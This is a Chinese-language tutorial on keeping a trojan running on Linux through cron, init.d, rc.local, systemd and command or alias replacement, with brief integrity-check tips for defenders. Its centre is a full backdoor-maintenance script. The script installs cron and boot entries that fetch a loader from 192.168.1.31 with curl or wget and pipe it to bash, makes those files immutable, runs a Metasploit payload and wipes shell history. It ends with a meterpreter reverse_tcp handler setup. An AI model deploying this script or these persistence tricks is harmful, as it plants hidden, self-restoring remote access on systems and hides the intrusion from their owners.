# 1 木马自动运行

黑客让脚本自动执行的 3 种方法：
（1）计划任务
（2）开机启动
（3）命令替换（可升级为库文件劫持——系统命令需要加载库文件）

## 1.1 计划任务

配置当前**用户的计划任务**

```
[root@CentOS-76 ~]# crontab -e
```

配置指定用户 centos 的计划任务

```
[root@CentOS-76 ~]# crontab -e -u centos
```

查看计划任务的配置格式

```
[root@CentOS-76 ~]# cat /etc/crontab
```

```
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
```

> `*` 代表 分，时，日，月，周
> 
> `&` 表示后台运行 

配置计划任务

```
[root@CentOS-76 ~]# crontab -e 
```

设置每次启动后台执行一次

```
@reboot ~/hello &
```

设置每小时后台执行一次

```
0  *  *  *  * ~/hello &
```

设置每小时的第六分钟后台执行一次

```
6  *  *  *  * ~/hello &
```

设置每十五分钟后台执行一次

```
*/15  *  *  *  * ~/hello &
```

设置每天八点到二十点，每十五分钟后台执行一次

```
*/15  8-20  *  *  * ~/hello &
```

设置每天的六点，八点，九点，每十五分钟后台执行一次

```
*/15  6,8,9  *  *  * ~/hello &
```

查看 root 用户计划任务

```
[root@CentOS-76 ~]# cat /var/spool/cron/root
```

```
* * * * * ~/hello &
```

加入检查程序，避免资源占用

```
[root@CentOS-76 ~]# vim /bin/check
```

```bash
#!/bin/bash
while true
do
#统计当前系统运行了几个木马进程
 a=`pgrep xuegod | wc -l`
#如查木马进程数小于 1 则运行木马程序。
 if [ $a -lt 1 ]; then
#运行之前判断木马文件是否存在，如果不存在则通过备份文件进行恢复。
 if [ ! -f "/root/hello" ]; then
 /bin/cp /tmp/hello /root/hello
 fi
#运行木马程序
 /root/hello &
 fi
done
```

> 也可以将木马程序用 base64 编码，直接存放在检查程序中

给检查程序添加执行权限

```
[root@CentOS-76 ~]# chmod +x /bin/check
```

执行检查程序

```
/bin/check
```

> 可以通过计划任务开启这个检查程序
> 
> 添加到计划任务要删除 `while true`

查看**系统级别的计划任务**

```
[root@CentOS-76 ~]# ls /etc/cron
```

```
cron.d/       cron.deny     cron.monthly/ cron.weekly/  
cron.daily/   cron.hourly/  crontab
```

> 其中 `crontab`  `cron.d/`    `cron.monthly/`    `cron.weekly/`    `cron.daily/`    `cron.hourly/`  中存放了相应的系统级别启动任务

查看每天执行的系统级别的计划任务的内容

```
[root@CentOS-76 ~]# ls /etc/cron.daily
```

```
logrotate  man-db.cron  mlocate
```

```
[root@CentOS-76 ~]# cat /etc/cron.daily/logrotate
```

```
#!/bin/sh

/usr/sbin/logrotate -s /var/lib/logrotate/logrotate.status /etc/logrotate.conf
EXITVALUE=$?
if [ $EXITVALUE != 0 ]; then
    /usr/bin/logger -t logrotate "ALERT exited abnormally with [$EXITVALUE]"
fi
exit 0
```

> 可以看到是直接将脚本存放到了目录文件中
> 
> 除了 `cron.d/` 其它目录的脚本不需要加 `*` 指定时间

| 目录            | 描述              |
| ------------- | --------------- |
| crontab       | 写具体时间的系统级别的定时任务 |
| cron.d/       | 系统级别的定时任务       |
| cron.daily/   | 系统每天要执行的计划任务    |
| cron.hourly/  | 系统每小时要执行的计划任务   |
| cron.monthly/ | 系统每月要执行的计划任务    |
| cron.weekly/  | 系统每周要执行的计划任务    |

可以在 `cron.daily/` 创建一个每天自动执行的脚本

```
#!bin/bash
~/hello &
```

或者直接写入原有的脚本中

```
#!/bin/sh
~/hello &
/usr/sbin/logrotate -s /var/lib/logrotate/logrotate.status /etc/logrotate.conf
EXITVALUE=$?
if [ $EXITVALUE != 0 ]; then
    /usr/bin/logger -t logrotate "ALERT exited abnormally with [$EXITVALUE]"
fi
exit 0
```

> 记得要在判定条件之前写

或者与原有的脚本拼接，达到隐藏目的

```
#!/bin/sh
~/hello &
/usr/sbin/logrotate -s /var/lib/logrotate/logrotate.status /etc/logrotate.conf;~/hello &
EXITVALUE=$?
if [ $EXITVALUE != 0 ]; then
    /usr/bin/logger -t logrotate "ALERT exited abnormally with [$EXITVALUE]"
fi
exit 0
```

> 运维安全可提前备份 md5 值来校验以筛查

对计划任务进行 md5 的编码

```
[root@CentOS-76 ~]# find /etc/cron* -type f | xargs -I {} md5sum {} > ~/hello.txt
```

> 优先使用 `xargs`

或者使用 `-exec` 拼接

```
[root@CentOS-76 ~]# find /etc/cron* -type f -exec md5sum {} \; > ~/hello.txt
```

对比两个文件

```
[root@CentOS-76 ~]# diff hello1.txt hello2.txt
```

```
4d3
< 6e10e35911b4ba4e2dff44613b56676f  /etc/cron.daily/logrotate
6a6
> bb8015364378f4e83a1aff54fde1047b  /etc/cron.daily/logrotate
```

> 记得将校验备份在其它主机避免被破坏

## 1.2 开机启动

分为：

init

systemd

> init 和 systemd 是所有进程的父进程
> 
> 目前在系统中并存

旧的系统用    `service`     管理启动项

新的系统用    `systemctl` 管理启动项

### 1.2.1 init

查看 init.d 目录

> 将系统启动项存放在此目录下即可

```
[root@CentOS-76 ~]# ls /etc/init.d
```

```
functions  netconsole  network  README
```

```
[root@CentOS-76 ~]# vim /etc/init.d/network 
```

> 发现是一个脚本文件

其中的必须有的代码是

```
#! /bin/bash
#
# network       Bring up/down networking
#
# chkconfig: 2345 10 90
# description: Activates/Deactivates all network interfaces configured to \
```

> `2345`     代表在那些系统启动级别中启动
> 
> `10`         代表启动级别，数字越小，级别越高
> 
> `90`         代表关闭级别，数字越小，级别越高
> 
> 像是网络相关的启动项一般启动级别较高，关闭级别较低，避免数据异常
> 
> 例如： `10` `90` 
> 
> `description` 是描述，可写入任意字符

写一个自己的启动项

```
[root@CentOS-76 ~]# vim /etc/init.d/hello
```

```
#!/bin/bash
# chkconfig: 2345 90 90
# description: hello
~/hello &
```

添加执行权限

```
[root@CentOS-76 ~]# chmod +x /etc/init.d/hello 
```

将脚本加入到系统启动项

```
[root@CentOS-76 ~]# chkconfig --add hello
```

> 删除用 `--del`
> 
> 当使用 `chkconfig` 添加时会将 `hello` 脚本链接到 `/etc/rc.d` 
> 
> ```
> [root@CentOS-76 ~]# ls /etc/rc.d/
> ```
> 
> ```
> init.d  rc0.d  rc1.d  rc2.d  rc3.d  rc4.d  rc5.d  rc6.d  rc.local
> ```
> 
> > 不同的文件对应不同的系统启动级别

查看启动配置

```
[root@CentOS-76 ~]# chkconfig --list hello
```

也可加入到 `/etc/rc.local`

```
[root@CentOS-76 ~]# vim /etc/rc.local
```

```
~/hello &
```

> 直接写入即可，无需加启动级别
> 
> 但是需要将 `/etc/rc.d/rc.local` 添加执行权限

添加执行权限

```
[root@CentOS-76 ~]# chmod +x /etc/rc.d/rc.local
```

### 1.2.2 systemd

查看 sshd 启动项

```
[root@CentOS-76 ~]# systemctl status sshd.service
```

```
/usr/lib/systemd/system/sshd
```

列出启动项

```
[root@CentOS-76 ~]# ls /usr/lib/systemd/system/
```

> 这个目录下的 `.service` 文件就是启动项

创建一个启动项

```
[root@CentOS-76 ~]# vim /usr/lib/systemd/system/hello.service
```

```
[Until]
Description=hello
After=network.target

[Service]
Type=simple
ExecStart=/root/hello &

[Install]
WantedBy=multi-user.target
```

> 这里的 `ExecStart` 需要使用绝对路径

允许开机启动

```
[root@CentOS-76 ~]# systemctl enable hello.service
```

```
Created symlink from /etc/systemd/system/multi-user.target.wants/hello.service to /usr/lib/systemd/system/hello.service.
```

> 可以根据其它的启动项制作

> Type=simple: 默认值，如果该服务文件没有包含ExecStartPre或ExecStopPost等其它启动或停止命令，那么主进程就是ExecStart行指定的命令。当该命令被执行时，系统会立即认为服务已启动。
> 
> Type=forking: 对于传统的守护进程，当主进程成功启动后会“孵化”一个或多个子进程然后终止，此时使用Type=forking。这种类型的服务需要指定PIDFile参数来告诉Systemd子进程的PID，以便正确地管理服务。
> 
> Type=oneshot: 这种类型的服务在启动过程中只会执行一次，不会持续运行。如果服务需要执行一系列的一次性任务，如系统初始化任务，可以使用这种类型。
> 
> Type=notify: 当服务启动后，将通过Systemd通知API通知init系统它已经完成启动。这需要服务内部发送一个特殊的通知消息。
> 
> Type=idle: 这种类型与simple相似，但是会延迟启动服务直到所有其他任务完成。这通常用于提高shell的启动速度，确保打印到控制台的信息不会与shell的启动信息混合。
> 
> Type=dbus: 如果服务在D-Bus上提供一个服务并且取得名称，当取得名称时Systemd会认为服务已启动。此类型的服务必须指定BusName字段。

排查目录：

> /etc/init.d/
> 
> /etc/rc.local/
> 
> /usr/lib/systemd/system/

## 1.3 命令替换

使用 `rpm` 检查文件的完整性

```
[root@CentOS-76 ~]# rpm -V httpd
```

```
S.5....T.    /usr/sbin/httpd
.....UG..    /var/www/html
```

> 跟软件包的名字，使用 rpm 命令检查软件包安装后，生成的所有文件的完整性

```
[root@CentOS-76 ~]# rpm -Vf /usr/sbin/httpd
```

```
S.5....T.    /usr/sbin/httpd
.....UG..    /var/www/html
```

> 跟命令的绝对路径，使用 rpm 检查命令的完整性

```
[root@CentOS-76 ~]# rpm -Va
```

> 检查全部命令的完整性，用于备份

| 操作  | 描述                |
| --- | ----------------- |
| S   | 大小不一致             |
| M   | 模式不一致 (包括许可和文件类型) |
| 5   | 校验和不一致            |
| D   | 主从设备号不匹配          |
| L   | 路径不匹配             |
| U   | 属主不一致             |
| G   | 所属组不一致            |
| T   | 修改时间不一致           |

**替换 pwd 命令**

将原有的 pwd 命令文件名修改为

```
[root@CentOS-76 ~]# mv /usr/bin/pwd /usr/bin/hello
```

创建新的 pwd 文件

```
[root@CentOS-76 ~]# vim /usr/bin/pwd
```

```
#!/bin/bash
/usr/bin/hello
echo "hello"
```

尝试执行

```
root@CentOS-76 ~]# pwd
/root
```

> 发现只执行了，`pwd` 命令，插入的 `echo` 并未执行
> 
> 由于 `pwd` 是 `shell` 的内置命令，相当于 `echo $PWD` 不从文件中执行

在配置加入别名，使 `pwd` 命令使用文件的服务执行

```
[root@CentOS-76 ~]# sed -i '$a alias pwd="/usr/bin/pwd"' /etc/bashrc
```

 启动别名配置

```
[root@CentOS-76 ~]# source /etc/bashrc
```

添加执行权限

```
[root@CentOS-76 ~]# chmod +x /usr/bin/pwd
```

执行 `pwd` 命令

```
[root@CentOS-76 ~]# pwd
```

```
/root
hello
```

> 除了 `shell` 也可能存在环境变量 `$PATH` 中
> 
> ```
> [root@CentOS-76 ~]# echo $PATH
> ```
> 
> ```
> /usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/root/bin
> ```

也可以利用别名隐藏

```
[root@CentOS-76 ~]# sed -i '$a alias pwd="/usr/bin/pwd;echo 666"' /etc/bashrc
```

> 一定要记得启动别名配置

查看别名

```
[root@CentOS-76 ~]# alias
```

```
alias cp='cp -i'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias l.='ls -d .* --color=auto'
alias ll='ls -l --color=auto'
alias ls='ls --color=auto'
alias mv='mv -i'
alias pwd='/usr/bin/pwd;echo 666'
alias rm='rm -i'
alias which='alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde'
```

# 2 后门维持脚本

```bash
#!/bin/bash
#reverse shell address
domain=192.168.1.31
#payload名称
payload=hello
#加载脚本名称
loader=loader
#启动脚本路径
loadup=/etc/init.d/loader
#workerdir
gitdir=./.git
mkdir -p /tmp/.a/.b/.c/
tmp=/tmp/.a/.b/.c
#当前进程数量
workerdir(){
  #已经建立的链接数量
  num=`netstat -antup|grep $domain |grep ESTABLISHED|wc -l`
  #能否访问domain获取http请求状态码
  trigger=`curl -I -m 10 -o /dev/null -s -w %{http_code}  http://$domain/`
  if [[ $num -lt 1 && $trigger -eq 200 ]];then
  #初始化工作目录
    if [ ! -d ~/.git ]; then 
      mkdir ~/.git
    fi
    if [ ! -d ./.git ]; then
      mkdir ./.git
    fi
 
    if [ -d ~/.git ]; then
      gitdir=~/.git
    fi
    if [ -d ./.git ]; then
      gitdir=./.git
    fi
  fi
}


createcron(){
    #添加计划任务
    cron=`grep $domain /etc/cron.d/root|wc -l`
    #判断句计划任务是否存在
    if [[ ! -f /etc/cron.d/root || cron -eq 0 ]]; then 
      chattr -i -a /etc/cron.d
      chattr -i -a /etc/cron.d/root
      #写入计划任务
      #-s表示不输出统计信息 -S表示输出错误信息需要配合-s使用 -L跟随重定向 -f 连接失败时不显示http错误
      echo "*/1 * * * * root (curl -fsSL http://$domain/$loader || wget -q -O- http://$domain/$loader || python -c 'import urllib2 as fbi;print fbi.urlopen("http://$domain/$loader").read()')| bash -sh > /dev/null 2>&1 &" >/etc/cron.d/root
      #添加ia权限 i权限表示不能修改文件，a权限仅允许增加内容不允许减少。
      chattr +i +a /etc/cron.d/root
      chattr +i +a /etc/cron.d
    fi
}

createinit(){
    #添加开机启动脚本 domain loader手工替换
    if [ ! -f $loadup ];then
tee $loadup << 'EOF'
#!/bin/bash
# chkconfig: 12345 90 90
# description: loader
### END INIT INFO
(curl -fsSL http://192.168.1.31/loader || wget -q -O- http://192.168.1.31/loader || python -c 'import urllib2 as fbi;print fbi.urlopen(http://192.168.1.31/loader).read()')| bash -sh > /dev/null 2>&1 &
EOF

    #启动脚本添加权限
    chmod +x $loadup
    chkconfig --add loader
    chattr +i +a $loadup
    fi
    #判断systemd启动脚本是否存在，不存在则创建。
    if [ ! -f /usr/sbin/hello ];then
tee /usr/sbin/hello << 'EOF'
#!/bin/bash
(curl -fsSL http://192.168.1.31/loader || wget -q -O- http://192.168.1.31/loader || python -c 'import urllib2 as fbi;print fbi.urlopen(http://192.168.1.31/loader).read()')| bash -sh > /dev/null 2>&1 &
EOF
    
    chmod +x /usr/sbin/hello
        #创建systemd开机启动服务
        if [ ! -f /lib/systemd/system/hello.service ];then
tee /lib/systemd/system/hello.service << 'EOF'
[Unit]
Description=hello
After=network.target

[Service]
Type=forking
ExecStart=/usr/sbin/hello

[Install]
WantedBy=multi-user.target

EOF

        #添加开机自启动并立即启动
        systemctl daemon-reload
        systemctl enable --now hello.service
       
        fi

    fi
}
download(){
    #下载msf payload到临时目录并添加ia权限
    if [ ! -f $tmp/$payload ]; then
      curl -fsSL -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91. 0.4472.124 Safari/537.36 Edg/91.0.864.64"  http://$domain/$payload  -o $tmp/$payload || wget -U "Mozilla/5.0 (Windows NT 10. 0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64" -q http://$domain/$payload -O $tmp/$payload
      chattr +ia $tmp/$payload
      chattr +ia $tmp
    fi   
}
runpayload(){
  #运行msf payload

  #检测msf payload已经建立的链接数量
  num=`netstat -antup|grep $domain |grep ESTABLISHED|wc -l`
  #如果工作目录中payload不存在，从临时目录cp一份并添加ia权限
  if [ ! -f $gitdir/$payload ]; then
    cp -a -r -f $tmp/$payload $gitdir/$payload
    chmod +x $gitdir/$payload
    chattr +ia $gitdir/$payload
    #chattr +ia $gitdir
  fi    
  #判断如果是docker环境并且进程数量少于1直接运行
  if [[ -e  /.dockerenv && $num -lt 1 ]];then
    $gitdir/$payload
  fi
  #进程数小于1则运行。
  if [ $num -lt 1 ];then
    nohup $gitdir/$payload >>$gitdir/.log&
  fi
  
  #简单清理history记录
  sed -i '/$domain/d' ~/.bash_history
  sed -i '/chattr/d' ~/.bash_history  
}

while true
do
  #获取当前bash -sh进程数量
  loadernum=`ps -aux|grep -v grep |grep "bash -sh" |wc -l`
  #数量少于3则运行，脚本执行到这里进程中会有2个bash -sh，所以少于3运行。
  #大于等于3的时候启动的新进程会自动退出。
  if [ $loadernum -ge 3 ];then 
    break
  fi
  #按顺序循环执行上面创建的函数。
  workerdir
  createcron
  createinit
  download
  runpayload
  #sleep 3 这里是为了减少一些难度，并且避免程序死循环一直执行消耗过多系统资源。
  sleep 3

done

```

# 3 上线 MSF

开启侦听

```
┌──(root㉿kali-31)-[/var/www/html]
└─# msfdb run
```

```
msf6 > use exploit/multi/handler 
```

```
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
```

```
msf6 exploit(multi/handler) > set lhost 192.168.1.31
```

```
run -j
```

使目标下载脚本

```
[root@CentOS-76 ~]# nohup curl -fsSL http://192.168.1.31/loader|bash -sh > /dev/null 2>&1 &
```
